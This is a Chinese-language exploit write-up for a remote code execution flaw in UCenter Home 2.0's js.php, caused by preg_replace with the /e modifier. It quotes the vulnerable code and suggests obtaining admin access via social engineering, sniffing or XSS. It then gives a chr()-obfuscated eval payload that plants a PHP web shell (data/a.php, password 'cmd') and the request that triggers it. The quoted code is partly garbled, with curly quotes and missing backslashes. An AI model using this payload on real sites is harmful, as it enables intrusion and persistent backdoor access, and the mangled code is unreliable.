@@ -1,0 +1,103 @@
+uchome 2.0 JS.php远程代码执行漏洞
+
+漏洞介绍：uchome<=2.0的程序中js.php文件存在代码执行漏洞,原因是正则匹配时引号使用不当,导致可以任意提交并执行PHP代码。
+ 
+Php中单引号与双引号是有区别的：
+ 
+” “双引号里面的字段会经过编译器解释，然后再当作HTML代码输出。
+ 
+‘ ‘单引号里面的不进行解释，直接输出。
+ 
+ 
+ 
+这里正则匹配后的\2在双引号里，导致了代码可以执行。
+ 
+ 
+ 
+Js.php 问题代码如下
+ 
+       复制内容到剪贴板 程序代码include template(“data/blocktpl/$id”);
+ 
+       
+ 
+       $obcontent = ob_get_contents();
+ 
+       obclean();
+ 
+       
+ 
+       $s = array(“/(r|n)/”, “/<divs+class=”pages”>.+?</div>/is”, “/s+(href|src)=”(.+?)”/ie”);
+ 
+       $r = array(“n”, ”, ‘js_mkurl(“\1″, “\2″)’);//代码执行 
+ 
+ 
+ 
+       $content = ”;
+ 
+       if($obcontent) {
+ 
+               $obcontent = preg_replace($s, $r, $obcontent);
+ 
+               $lines = explode(“n”, $obcontent);
+ 
+               foreach ($lines as $line) {
+ 
+                     $line = addcslashes(trim($line), ‘/’\');
+ 
+                     $content .= “document.writeln(‘$line’);n”;
+ 
+               }
+ 
+       } else {
+ 
+               $content .= “document.writeln(‘NO DATA’)”; 
+ 
+ 
+ 
+ 
+ 
+       }
+ 
+测试环境:
+ 
+系统环境:Windows 2003 + IIS + PHP 5.2.9-2 + Mysql 5.0.67
+ 
+程序环境:Ucenter Home 2.0(官方最新) + Ucenter 1.5(官方最新) 
+ 
+ 
+ 
+测试方法:
+ 
+ 
+ 
+首先我在本地安装了一个全新的uchome.。这个漏洞的前提是首先拿到后台权限。你可以通过社工、旁注、嗅探、Xss 等手段拿到管理员密码并进入后台。
+ 
+接着打开admincp.php?ac=block&op=add，选择第一个添加一个模块。填上模板名称、其他默认即可。然后提交。如下图
+ 
+ 
+ 
+接着在数据显示Html代码处填入如下代码然后提交
+ 
+复制内容到剪贴板 程序代码<a href=”{${eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97).chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))}}”>a</a>
+ 
+ 
+ 
+加密内容为fputs(fopen(‘data/a.php’,'w’),’<?php eval($_POST[cmd])?>’);
+ 
+ 
+ 
+保存后检查一下ID，如果ID是1，则访问一下js.php?id=1
+ 
+ 
+ 
+则在data目录下生成a.php一句话木马，密码是cmd
+ 
+ 
+ 
+我这里ID是2 所以我访问 js.php?id=2
+ 
+ 
+ 
+ 
+ 
+访问后data 目录下多出了一个a.php 
